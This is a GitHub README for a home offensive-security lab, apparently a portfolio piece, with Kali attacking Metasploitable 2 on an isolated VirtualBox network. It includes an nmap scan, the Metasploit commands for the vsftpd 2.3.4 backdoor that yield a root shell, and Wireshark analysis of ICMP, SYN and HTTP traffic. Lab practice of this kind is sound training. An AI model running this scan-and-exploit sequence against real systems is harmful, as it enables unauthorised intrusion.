
# Offensive Security Lab (Kali + Metasploitable 2) — Enumeration, Exploitation, and Traffic Analysis

## Overview
This repository documents a hands-on offensive security lab built in Oracle VirtualBox using **Kali Linux** as the attacker and **Metasploitable 2** as the intentionally vulnerable target. The goal was to practice a complete attack workflow in a controlled environment:

**Network setup → Connectivity validation → Enumeration → Exploitation → Proof of access → (Optional) Post-exploitation validation → Wireshark traffic analysis**

This project emphasizes *repeatable methodology* and *problem-solving* rather than “just running tools.”

---

## Lab Architecture

**Host OS:** Windows  
**Hypervisor:** Oracle VirtualBox  
**Network:** Isolated VirtualBox network (Internal Network)

| VM | Role | IP |
|---|---|---|
| Kali Linux | Attacker | `192.168.100.20/24` |
| Metasploitable 2 | Target | `192.168.100.10/24` |

**Why static IPs?**  
VirtualBox **Internal Network** has no DHCP server by default, so IPs must be assigned manually.

---

## Phase 1 — Network Configuration & Connectivity
![IMG_93E9D64B-AF0F-4EE9-BC1A-7E83DFF3B47A](https://github.com/user-attachments/assets/464feaf6-37a1-47c8-a954-0aafb25a5f84)

![IMG_E7675529-A26E-4D5C-BD33-720EA7F7F0FF](https://github.com/user-attachments/assets/50fedcf0-231f-4948-8348-ff5346c18cfc)


### What I did
1. Configured both VMs on the same isolated VirtualBox network.  
2. Assigned static IPs.
3. Validated connectivity with ICMP before scanning or exploiting.
   
### Commands used
Metasploitable:
```bash
sudo ifconfig eth0 192.168.100.10 netmask 255.255.255.0 up
ifconfig
```
---

## Phase 2 – Enumeration

After validating network connectivity, the next step was service discovery and vulnerability identification.

### Objectives
- Identify open ports
- Detect running services
- Determine service versions
- Identify potential vulnerabilities

### Tools Used
- Nmap
- Netcat
- Banner grabbing

### Initial Port Scan

```bash
nmap -sS -sV -O 192.168.100.10
```
Findings:

> 21/tcp – FTP (vsftpd 2.3.4)

> 22/tcp – SSH

> 80/tcp – Apache Web Server

> 139/445 – SMB etc.

---

## Phase 3 – Exploitation (vsftpd 2.3.4)
Objective

Exploit a known vulnerable service in a controlled lab to gain an initial foothold.
![IMG_DB4247DB-392F-4187-B781-F51802D0E0C6](https://github.com/user-attachments/assets/07d96b74-d1ba-47ac-86cf-fdff460f815c)


Tooling

Metasploit Framework (Kali)

Commands used
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.10
run

## Evidence Exploit success output:

### Proof of access (root shell)
> whoami

> uname -a



---
## Phase 4 — Lab Architecture & Network Configuration (Packet Capture & Analysis (Wireshark))
### Obejective:
Build an isolated internal lab to safely simulate attacks and analyze traffic. Validate and understand what offensive actions look like on the wire.

### What i Did

> Used Oracle VirtualBox

> Configured both Kali and Metasploitable to use:

> Internal Network

> Network Name: LabNet

> Adapter Type: Intel PRO/1000 MT Desktop

Virtual cable connected

network-configuration.png
![IMG_4AB94CD0-AA9D-4AFB-B696-9D417ECE742B](https://github.com/user-attachments/assets/7f13c4cf-1fef-48ef-8096-ad8fcbc38634)

This shows:

> Proper segmentation

> Isolated lab design

> Understanding of virtual networking
---

## Kali Installation & System Preparation
Objective: Prepare Kali for offensive operations and packet analysis.

What I Did:

## Verified internet connectivity: 
> ping google.com

> sudo apt update

> sudo apt install wireshark

ping google.com 
![IMG_490B1F49-95A6-49BE-A75F-E4FCF29C980E](https://github.com/user-attachments/assets/9eee6496-bf87-4830-89fa-1f393d93b730)


sudo apt update 
<img width="1536" height="2048" alt="image" src="https://github.com/user-attachments/assets/62a4db75-b556-43ac-9681-afdbea53ae6c" />

This proves:

- System preparation

- Package management familiarity

- Tool deployment

---
## Wireshark – Packet Capture & ICMP Analysis
Objective

Capture and analyze live network traffic.

### What I Observed

- Echo Requests

- Echo Replies

- Source and destination IP mapping

- TTL values

- Packet length (98 bytes)

This demonstrates:

Understanding of ICMP protocol

Traffic generation for controlled capture

Packet inspection workflow


<img width="2048" height="1536" alt="image" src="https://github.com/user-attachments/assets/ba5079f7-cf52-43fc-8a9c-dc7f53979ac0" />

---

## TCP Traffic & SYN Analysis
Objective:

Analyze TCP handshake behavior and scanning activity.

Applied filter:
> tcp.flags.syn == 1 && tcp.flags.ack == 0

This isolates:

- SYN packets

- Initial connection attempts

- Potential scan indicators

Observed:

- Multiple SYN packets

- Reset responses

- Different source/destination IP pairs

- TCP header details

This shows:

- Understanding of TCP 3-way handshake

- Ability to isolate scan behavior

- Knowledge of flag-based filtering

wireshark-tcp-syn-analysis.png
<img width="2048" height="1536" alt="image" src="https://github.com/user-attachments/assets/ad510a0c-b00d-4eb4-8184-9b0fe1f70310" />

---

## HTTP Traffic Inspection
Objective

Inspect application-layer traffic.
Captured HTTP packets

- Observed:

> GET request

> 200 OK response

> Headers

> Payload

This demonstrates:

- Layer 7 inspection

- Application protocol understanding

- Clear traffic interpretation

wireshark-http-analysis.png
<img width="2048" height="1536" alt="image" src="https://github.com/user-attachments/assets/b41b4553-256e-4239-bd74-add285552cf5" />

## Technical Skills Demonstrated

- Virtual network segmentation

- Offensive exploitation (Metasploit)

- Post-exploitation validation

- Packet capture analysis

- ICMP/TCP/HTTP protocol analysis

- SYN scan detection

- Display filtering logic

- Linux package management

- Root shell verification

